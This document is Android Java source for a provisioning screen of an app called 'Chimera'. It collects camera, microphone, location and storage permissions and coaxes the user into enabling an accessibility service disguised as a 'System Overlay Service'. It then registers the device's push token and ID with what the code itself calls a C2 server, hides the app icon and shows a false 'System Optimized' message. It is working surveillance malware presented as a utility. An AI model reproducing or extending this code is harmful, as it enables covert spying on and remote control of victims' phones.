package com.chimera;

import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.text.TextUtils;
import android.util.Log;
import android.widget.Button;
import android.widget.TextView;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.Volley;
import com.google.firebase.messaging.FirebaseMessaging;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;

public class ProvisioningActivity extends AppCompatActivity {

    private static final String TAG = "ProvisioningActivity";
    private static final int PERMISSIONS_REQUEST_CODE = 101;
    private static final String NETLIFY_REGISTER_URL = "https://chimeradmin.netlify.app/.netlify/functions/register-device";

    private TextView tvCheckPermissions;
    private TextView tvCheckAccessibility;
    private TextView tvDeviceInfo;
    private Button btnFinalize;

    private RequestQueue requestQueue;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_provisioning);

        requestQueue = Volley.newRequestQueue(this);

        tvCheckPermissions = findViewById(R.id.tvCheckPermissions);
        tvCheckAccessibility = findViewById(R.id.tvCheckAccessibility);
        tvDeviceInfo = findViewById(R.id.tvDeviceInfo);
        btnFinalize = findViewById(R.id.btnFinalize);

        String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        tvDeviceInfo.setText("Device ID: " + deviceId);

        tvCheckPermissions.setOnClickListener(v -> requestAppPermissions());
        tvCheckAccessibility.setOnClickListener(v -> {
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            startActivity(intent);
        });
        btnFinalize.setOnClickListener(v -> beginActivationSequence());
    }

    @Override
    protected void onResume() {
        super.onResume();
        checkSystemState();
    }

    private void checkSystemState() {
        boolean permsGranted = arePermissionsGranted();
        boolean accessibilityEnabled = isAccessibilityServiceEnabled();

        updateChecklistItem(tvCheckPermissions, "Core Permissions", permsGranted);
        updateChecklistItem(tvCheckAccessibility, "System Overlay Service", accessibilityEnabled);

        if (permsGranted && accessibilityEnabled) {
            btnFinalize.setEnabled(true);
            btnFinalize.setBackgroundColor(Color.parseColor("#0088CC"));
            btnFinalize.setTextColor(Color.WHITE);
        } else {
            btnFinalize.setEnabled(false);
            btnFinalize.setBackgroundColor(Color.parseColor("#444444"));
            btnFinalize.setTextColor(Color.parseColor("#888888"));
        }
    }

    private String[] getRequiredPermissions() {
        List<String> permissions = new ArrayList<>();
        permissions.add(android.Manifest.permission.ACCESS_FINE_LOCATION);
        permissions.add(android.Manifest.permission.ACCESS_COARSE_LOCATION);
        permissions.add(android.Manifest.permission.CAMERA);
        permissions.add(android.Manifest.permission.RECORD_AUDIO);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) { // Android 13+
            permissions.add(android.Manifest.permission.POST_NOTIFICATIONS);
        }

        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) { // Before Android 10
            permissions.add(android.Manifest.permission.WRITE_EXTERNAL_STORAGE);
        }

        if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.S_V2) { // Up to Android 12L
             permissions.add(android.Manifest.permission.READ_EXTERNAL_STORAGE);
        }


        return permissions.toArray(new String[0]);
    }

    private boolean arePermissionsGranted() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) {
            return true;
        }
        for (String permission : getRequiredPermissions()) {
            if (checkSelfPermission(permission) != PackageManager.PERMISSION_GRANTED) {
                Log.w(TAG, "Permission check failed for: " + permission);
                return false;
            }
        }
        return true;
    }

    private boolean isAccessibilityServiceEnabled() {
        ComponentName expectedComponentName = new ComponentName(this, CoreService.class);
        String enabledServicesSetting = Settings.Secure.getString(getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
        if (enabledServicesSetting == null) {
            return false;
        }
        TextUtils.SimpleStringSplitter colonSplitter = new TextUtils.SimpleStringSplitter(':');
        colonSplitter.setString(enabledServicesSetting);
        while (colonSplitter.hasNext()) {
            ComponentName enabledService = ComponentName.unflattenFromString(colonSplitter.next());
            if (expectedComponentName.equals(enabledService)) {
                return true;
            }
        }
        return false;
    }

    private void updateChecklistItem(TextView textView, String text, boolean isChecked) {
        String prefix = isChecked ? "[✅] " : "[⏳] ";
        int color = isChecked ? Color.GREEN : Color.YELLOW;
        textView.setText(prefix + text);
        textView.setTextColor(color);
    }

    private void requestAppPermissions() {
        List<String> neededPermissions = new ArrayList<>();
        for (String permission : getRequiredPermissions()) {
            if (checkSelfPermission(permission) != PackageManager.PERMISSION_GRANTED) {
                neededPermissions.add(permission);
            }
        }
        if (!neededPermissions.isEmpty()) {
            ActivityCompat.requestPermissions(this, neededPermissions.toArray(new String[0]), PERMISSIONS_REQUEST_CODE);
        }
    }

    private void beginActivationSequence() {
        btnFinalize.setEnabled(false);
        btnFinalize.setText("Activating...");
        tvDeviceInfo.append("\n\nStatus: Fetching C2 token...");
        getTokenAndRegister();
    }

    private void getTokenAndRegister() {
        FirebaseMessaging.getInstance().getToken().addOnCompleteListener(task -> {
            if (!task.isSuccessful()) {
                Log.w(TAG, "Fetching FCM registration token failed", task.getException());
                tvDeviceInfo.append("\nStatus: FAILED. Check network.");
                btnFinalize.setEnabled(true);
                btnFinalize.setText("Retry Activation");
                return;
            }
            String token = task.getResult();
            String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
            registerDeviceWithNetlify(deviceId, token);
        });
    }

    private void registerDeviceWithNetlify(String deviceId, String token) {
        tvDeviceInfo.append("\nStatus: Registering with C2 server...");
        JSONObject postData = new JSONObject();
        try {
            postData.put("deviceId", deviceId);
            postData.put("token", token);
        } catch (JSONException e) {
            Log.e(TAG, "JSON payload creation failed", e);
            tvDeviceInfo.append("\nStatus: FAILED. Internal error.");
            return;
        }

        JsonObjectRequest request = new JsonObjectRequest(Request.Method.POST, NETLIFY_REGISTER_URL, postData,
                response -> {
                    Log.d(TAG, "Registration Success: " + response.toString());
                    tvDeviceInfo.append("\nStatus: ✅ Registration Complete.");
                    goDark();
                },
                error -> {
                    Log.e(TAG, "Registration Error: " + error.toString());
                    tvDeviceInfo.append("\nStatus: ❌ FAILED. C2 server rejected connection.");
                    btnFinalize.setEnabled(true);
                    btnFinalize.setText("Retry Activation");
                }
        );
        requestQueue.add(request);
    }

    private void goDark() {
        btnFinalize.setText("Activation Complete");
        tvDeviceInfo.append("\n\nSystem Optimized. This utility can now be closed.");

        Intent intent = new Intent(this, CoreService.class);
        intent.setAction("com.chimera.action.TOGGLE_ICON");
        intent.putExtra("show", false);
        startService(intent);

        new Handler(Looper.getMainLooper()).postDelayed(this::finish, 3000);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        // The onResume will handle the state check
    }
}
